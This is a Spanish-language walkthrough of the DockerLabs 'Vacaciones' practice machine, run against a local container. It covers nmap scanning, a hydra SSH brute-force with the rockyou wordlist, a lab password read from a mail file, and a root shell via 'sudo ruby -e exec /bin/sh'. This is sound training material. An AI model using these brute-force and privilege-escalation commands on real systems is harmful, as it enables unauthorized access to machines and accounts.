Vacaciones-DockerLabs🇪🇸

**1. En primer lugar descomprimimos el archivo facilitado.**
```bash
unzip vacaciones.zip 
```

<img width="954" height="300" alt="image" src="https://github.com/user-attachments/assets/cc3f31c2-63c8-474a-8d50-852ed5304eee" />

**2. Procedemos a iniciar la máquina.**
```bash
sudo bash ./auto_deploy.sh vacaciones.tar 
```

<img width="957" height="259" alt="image" src="https://github.com/user-attachments/assets/c1e9ef60-6609-485d-b37a-5667af7bb9e1" />


**3. Ahora para comprobar la conexión con la máquina procederemos a hacer un ping.**
```bash
 ping -c3 172.17.0.2
```

<img width="959" height="221" alt="image" src="https://github.com/user-attachments/assets/0733316b-2076-4a27-8f30-5e131ac7ede8" />


**4. Ahora vamos a rastrear si tiene la máquina algun puerto abierto con nmap**
```bash
 sudo nmap -sCV 172.17.0.2
```

<img width="920" height="368" alt="image" src="https://github.com/user-attachments/assets/21c94f6d-1451-409b-ba93-7167363320a0" />




**5. Podremos encontrar en la web un mensaje oculto en el codigo fuente.**

<img width="951" height="1033" alt="image" src="https://github.com/user-attachments/assets/57dba73c-2d81-48df-b221-99bf95b9871c" />


**6. Sabiendo el mensaje podremos ejercer el CLI de hydra como fuerza bruta.**
```bash
 hydra -l camilo -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2```
```

<img width="983" height="269" alt="image" src="https://github.com/user-attachments/assets/b40105ca-db7b-4b8a-b485-f84682a39eff" />

**7. Ahora sabiendo el usuario procederemos a hacer un ssh.**
```bash
ssh camilo@172.17.0.2
```

<img width="968" height="319" alt="image" src="https://github.com/user-attachments/assets/a710e94b-8bb7-4372-b0ec-707bb9c4d033" />

**8. Ahora procederemos a escalar los privilegios**

**8.1 Buscaremos un archivo y encontraremos esto en el sistema.**
```bash
cd /var/mail/camilo 
ls -lah
cat correo.txt
```

<img width="958" height="307" alt="image" src="https://github.com/user-attachments/assets/48446c87-570d-4576-bf47-eee9ae4face3" />


**8.2 Ahora somos juan y escalamos de nivel de privilegios.**
```bash
su juan
#passwd: 2k84dicb
```

<img width="964" height="105" alt="image" src="https://github.com/user-attachments/assets/a2ddac08-374b-41d0-b05a-e81357a687cb" />


**8.3 Procederemos a mirar los privilegios que tiene con `sudo -l`**


<img width="969" height="155" alt="image" src="https://github.com/user-attachments/assets/a7fddb19-beef-475a-bb28-f7e868c2290c" />


**8.4 Por último nos informaremos de que es ruby y como podemos acceder a su shell**


<img width="951" height="475" alt="image" src="https://github.com/user-attachments/assets/e18ec728-babd-4b30-bbaf-b1eb1958d836" />

**8.5 Ejecutaremos el comando que hemos encontrado.**
```bash
sudo -u root ruby -e 'exec "/bin/sh"' 
```

<img width="865" height="83" alt="image" src="https://github.com/user-attachments/assets/4369fb5f-435c-489a-8508-f9808d86a998" />



